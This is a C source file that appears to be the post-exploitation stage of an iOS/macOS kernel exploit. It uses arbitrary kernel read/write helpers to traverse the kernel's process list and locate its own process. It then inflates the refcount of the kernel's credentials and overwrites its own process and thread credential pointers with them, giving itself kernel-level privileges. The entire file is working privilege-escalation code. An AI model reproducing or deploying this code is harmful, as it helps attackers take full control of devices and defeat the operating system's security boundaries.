#include "post_exploit.h"
#include "offsets.h"
#include "rwx.h"

#include <stdlib.h>
#include <stdio.h>
#define MAX_PROCESSES_IN_SYSTEM							(0xffff)

/*
 * Function name: 	post_exploit_set_cred_for_all_threads
 * Description:		Overwrites the creds of all the threads belonging to the same proc.
 * Returns:			kern_return_t.
 */

static
kern_return_t post_exploit_set_cred_for_all_threads(uint64_t thread, uint64_t creds) {
	
	kern_return_t ret = KERN_SUCCESS;
	uint64_t thread_next = 0;
	if (thread != 0)
	{
		do {
			/* update thread's cred */
			ret = rwx_write(thread + OFFSET(struct_uthread_uu_ucred), &creds, sizeof(creds));
			if (KERN_SUCCESS != ret)
			{
				printf("[ERROR]: Error replacing credentials for thread!");
				goto cleanup;
			} else {
				printf("[INFO]: Replaced credentials for thread");
			}

			ret = rwx_read(thread + OFFSET(struct_uthread_uu_list), &thread_next, sizeof(thread_next));
			if (KERN_SUCCESS != ret)
			{
				printf("[ERROR]: Failed reading next thread!");
				goto cleanup;
			} else {
				printf("[INFO]:next thread: %p", (void*)thread_next);
			}

			thread = thread_next;

		}while(0 != thread_next);
	}

cleanup:
	return ret;
}



/*
 * Function name: 	post_exploit_copy_cred
 * Description:		Copies the credentials from one proc to another.
 * Returns:			kern_return_t.
 */

static
kern_return_t post_exploit_copy_cred(uint64_t proc_from, uint64_t proc_to) {
	
	kern_return_t ret = KERN_SUCCESS;
	unsigned long creds_from = 0;
	unsigned long new_credentials_refcount = 0x444444;
	unsigned long uthread = 0;

	ret = rwx_read(proc_from + OFFSET(struct_proc_p_ucred), &creds_from, sizeof(creds_from));
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: Error reading STRUCT_PROC_P_UCRED_OFFSET");
	} else {
		printf("[INFO]: kernel_creds: %p", (void*)creds_from);
	}

	printf("[INFO]: leaking kernel creds' refcount...");

	/* leak creds */
	ret = rwx_write(creds_from + OFFSET(struct_kauth_cred_cr_ref), &new_credentials_refcount, sizeof(new_credentials_refcount));
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: Error leaking credentials!");
		goto cleanup;
	} else { 
		printf("[INFO]: Successfully leaked credentials!");
	}

	printf("[INFO]: replacing credentials...");

	/* replace proc_to's credentials pointer with proc_from's credentials pointer */
	ret = rwx_write(proc_to + OFFSET(struct_proc_p_ucred), &creds_from, sizeof(creds_from));
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: Error replacing credentials!");
		goto cleanup;
	} else {
		printf("[INFO]: Successfully replaced credentials!");
	}

	printf("[INFO]: replacing cached credentials...");

	/* replace cached credentials */
	ret = rwx_read(proc_to + OFFSET(struct_proc_p_uthlist), &uthread, sizeof(uthread));
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: Error reading thread list");
		goto cleanup;
	} else {
		printf("[INFO]: uthread: %p", (void*)uthread);
	}

	ret = post_exploit_set_cred_for_all_threads((void*)uthread, (void*)creds_from);

cleanup:
	return ret;
}



/*
 * Function name: 	post_exploit_find_proc
 * Description:		Finds the 'proc' of the process name proc_name.
 * Returns:			kern_return_t and proc in output params.
 */

static
kern_return_t post_exploit_find_proc(const char * proc_name, uint64_t * proc_out) {
	
	kern_return_t ret = KERN_SUCCESS;
	unsigned long proc = 0, next_proc = 0;
	unsigned int i = 0;
	char current_proc_name[16] = {0};
	ret = rwx_read((uint64_t)(offsets_get_kernel_base() + OFFSET(all_proc)), &proc, sizeof(proc));
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]:error reading allproc");
	}
	else { 
		printf("[INFO]:allproc: %p", (void*)proc);
	}

	for(i = 0; i < MAX_PROCESSES_IN_SYSTEM; ++i) {
		memset(current_proc_name, 0, sizeof(current_proc_name));

		ret = rwx_read((uint64_t)(proc + OFFSET(struct_proc_p_comm)), current_proc_name, sizeof(current_proc_name));
		if (KERN_SUCCESS != ret)
		{
			printf("[ERROR]:failed reading process name %d", i);
			goto cleanup;
		}

		printf("[INFO]:Iterating process name: %s", current_proc_name);

		if (strstr(current_proc_name, proc_name))
		{
			*proc_out = (uint64_t)proc;
			goto cleanup;
		}

		ret = rwx_read((uint64_t)proc, &next_proc, sizeof(next_proc));
		if (KERN_SUCCESS != ret)
		{
			printf("[ERROR]: error reading next_proc");
			goto cleanup;
		}

		proc = next_proc;
	}

cleanup:
	return ret;

}



/*
 * Function name: 	post_exploit_get_kernel_creds
 * Description:		Updates the credentials of the current process to the kernel's credentials.
 * Returns:			kern_return_t.
 */

kern_return_t post_exploit_get_kernel_creds() {
	
	kern_return_t ret = KERN_SUCCESS;
	uint64_t kern_proc = 0;
	uint64_t self_proc = 0;

	ret = rwx_read(offsets_get_kernel_base() + OFFSET(kern_proc), (unsigned long*)&kern_proc, sizeof(kern_proc));
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]:error reading kern_proc");
		goto cleanup;
	}

	printf("[INFO]:kern_proc: %llx", kern_proc);

	ret = post_exploit_find_proc(getprogname(), &self_proc);
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]:error getting self proc");
		goto cleanup;
	}

	printf("[INFO]:self_proc: %llx", self_proc);

	ret = post_exploit_copy_cred(kern_proc, self_proc);
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]:error copying creds from kernel to us");
		goto cleanup;
	}

cleanup:
	return ret;
}

